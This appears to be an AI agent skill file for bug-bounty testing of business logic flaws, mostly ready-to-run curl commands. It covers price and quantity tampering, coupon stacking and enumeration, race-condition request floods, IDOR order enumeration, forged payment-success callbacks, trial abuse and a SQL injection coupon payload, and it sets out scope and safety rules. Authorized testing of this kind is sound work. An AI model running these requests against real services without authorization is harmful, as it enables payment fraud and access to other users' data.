---
name: bug-bounty-logic-bugs
description: Use for business logic vulnerability testing: price manipulation, quantity abuse, coupon/rate limiting bypass, workflow state manipulation, race conditions, and authorization flaws.
---

# Bug Bounty Business Logic Bugs

Use this skill for testing application-specific logic flaws that automated scanners miss.

## Price Manipulation

```bash
target="example.com"
slug="$(printf '%s' "$target" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9._-]/_/g')"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"

# Test negative prices
curl -sk -X POST "https://$target/cart/add" \
    -H "Content-Type: application/json" \
    -d '{"product_id":123,"price":-100,"quantity":1}'

# Test zero price
curl -sk -X POST "https://$target/cart/add" \
    -H "Content-Type: application/json" \
    -d '{"product_id":123,"price":0,"quantity":1}'

# Test very high discount
curl -sk -X POST "https://$target/checkout" \
    -H "Content-Type: application/json" \
    -d '{"items":[{"id":123}],"discount_code":"999OFF"}'

# Test currency manipulation
curl -sk -X POST "https://$target/checkout" \
    -H "Content-Type: application/json" \
    -d '{"amount":100,"currency":"USD"}' \
    -H "X-Currency: JPY"  # 100 JPY != 100 USD
```

## Quantity/Inventory Abuse

```bash
# Test negative quantity
curl -sk -X POST "https://$target/cart/add" \
    -d "product_id=123&quantity=-1"

# Test extremely high quantity
curl -sk -X POST "https://$target/cart/add" \
    -d "product_id=123&quantity=999999"

# Test zero quantity (free item?)
curl -sk -X POST "https://$target/cart/add" \
    -d "product_id=123&quantity=0"

# Test decimal quantities
curl -sk -X POST "https://$target/cart/add" \
    -d "product_id=123&quantity=0.5"
```

## Coupon/Discount Abuse

```bash
# Test coupon stacking
curl -sk -X POST "https://$target/checkout" \
    -d "coupon1=SAVE10&coupon2=SAVE20&coupon3=SAVE30"

# Test same coupon multiple times
curl -sk -X POST "https://$target/checkout" \
    -d "coupon=SAVE10&coupon=SAVE10&coupon=SAVE10"

# Test SQLi in coupon codes
curl -sk -X POST "https://$target/checkout" \
    -d "coupon=SAVE10' OR '1'='1"

# Test coupon enumeration
for i in {1..100}; do
    curl -sk -X POST "https://$target/checkout" \
        -d "coupon=DISCOUNT$i" | \
        grep -i "success\|applied" && \
        echo "Valid coupon: DISCOUNT$i" >> "$BB_ROOT/vulns/coupon-enum.txt"
done
```

## Workflow State Manipulation

```bash
# Test skipping steps in multi-step process
# Example: Skip payment step
steps=("/cart" "/shipping" "/payment" "/confirmation")

# Try accessing confirmation without payment
curl -sk "https://$target/checkout/confirmation" \
    -H "Cookie: session=YOUR_SESSION"

# Test going backwards in workflow
# Add item, skip to confirmation, go back to modify price

# Test replaying completed steps
# Complete purchase, try to replay with same cart
```

## Race Conditions

```bash
# Test concurrent requests (use with caution)
# Example: Use same coupon twice simultaneously
for i in {1..10}; do
    curl -sk -X POST "https://$target/checkout" \
        -d "coupon=ONCE_ONLY" &
done
wait

# Test concurrent purchases (inventory race)
for i in {1..20}; do
    curl -sk -X POST "https://$target/buy" \
        -d "product_id=123&quantity=1" &
done
wait

# Check if more items purchased than available
```

## Account/Privilege Logic Flaws

```bash
# Test upgrading account, then downgrading while keeping perks
curl -sk -X POST "https://$target/account/downgrade" \
    -H "Cookie: session=PREMIUM_SESSION"

# Test referral program abuse
for i in {1..50}; do
    curl -sk -X POST "https://$target/referral" \
        -d "referral_code=YOUR_CODE&email=test$i@example.com"
done

# Test free trial abuse
for email in "test1@example.com" "test2@example.com" "test3@example.com"; do
    curl -sk -X POST "https://$target/trial" \
        -d "email=$email"
done
```

## IDOR in Logic Flows

```bash
# Test accessing other users' orders
for order_id in {1000..1100}; do
    curl -sk "https://$target/orders/$order_id" \
        -H "Cookie: session=YOUR_SESSION" | \
        grep -i "order\|customer" && \
        echo "Accessible order: $order_id" >> "$BB_ROOT/vulns/idor-orders.txt"
done

# Test modifying other users' addresses
curl -sk -X PUT "https://$target/users/999/address" \
    -H "Cookie: session=YOUR_SESSION" \
    -d '{"street":"123 Hacker St"}'
```

## Time-Based Logic Flaws

```bash
# Test timezone manipulation
curl -sk -X POST "https://$target/purchase" \
    -H "X-Timezone: UTC+14"  # Future timezone
    -d "item=sale_item"

# Test accessing sales before start time
curl -sk "https://$target/sales/future-sale"

# Test expired coupon/access still working
curl -sk "https://$target/checkout" \
    -d "coupon=EXPIRED_COUPON"
```

## Payment Logic Flaws

```bash
# Test parameter tampering in payment
curl -sk -X POST "https://$target/payment" \
    -d "amount=0.01&currency=USD&product=expensive_item"

# Test changing payment status
curl -sk -X POST "https://$target/payment/callback" \
    -d "status=success&order_id=123"

# Test partial payment acceptance
curl -sk -X POST "https://$target/payment" \
    -d "amount=10&total=1000&order_id=123"
```

## Logic Bug Checklist

- [ ] Price manipulation (negative, zero, decimal)
- [ ] Quantity abuse (negative, excessive, zero)
- [ ] Coupon/discount stacking
- [ ] Workflow step skipping
- [ ] Race conditions (concurrent requests)
- [ ] Referral program abuse
- [ ] Free trial abuse
- [ ] Time/timezone manipulation
- [ ] Payment parameter tampering
- [ ] IDOR in business objects
- [ ] State manipulation (downgrade keeping perks)
- [ ] Inventory race conditions

## Reporting Logic Bugs

```markdown
## Business Logic Vulnerability

**Type:** Price Manipulation / Coupon Abuse / Race Condition / etc.
**Location:** https://target.com/checkout
**Parameter:** price / coupon / quantity

**Steps to Reproduce:**
1. Add item to cart
2. Modify price parameter to -100
3. Complete checkout
4. Observe negative total / credit added

**Impact:** Financial loss, free products, inventory depletion

**Evidence:**
- Request: `vulns/logic-bug-request.txt`
- Response: `vulns/logic-bug-response.txt`
- Order ID: #12345

**Remediation:**
- Server-side validation of all numeric inputs
- Business rule enforcement at database level
- Rate limiting and concurrency controls
```

## Tools for Logic Testing

- `burpsuite` - Request interception/modification
- `turbo intruder` - Race condition testing
- Custom scripts - Application-specific flows
- Browser dev tools - Client-side logic analysis

## Safety Rules

- Only test within authorized scope boundaries.
- Use self-owned test accounts exclusively. Never test on real user accounts.
- No destructive operations: no data deletion, no DoS, no real data exfiltration.
- Require explicit approval before active scanning, brute-force, or high-volume requests.
- All findings must be manually validated before reporting.

## Output Convention

All commands must save output to organized paths:

```bash
ts="$(date +%Y%m%d-%H%M%S)"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"
# stdout -> $BB_ROOT/<phase>/<tool>-$ts.txt
# stderr -> $BB_ROOT/logs/<tool>-$ts.err
```

Never dump raw tool output into chat context. Save to files, then read targeted excerpts.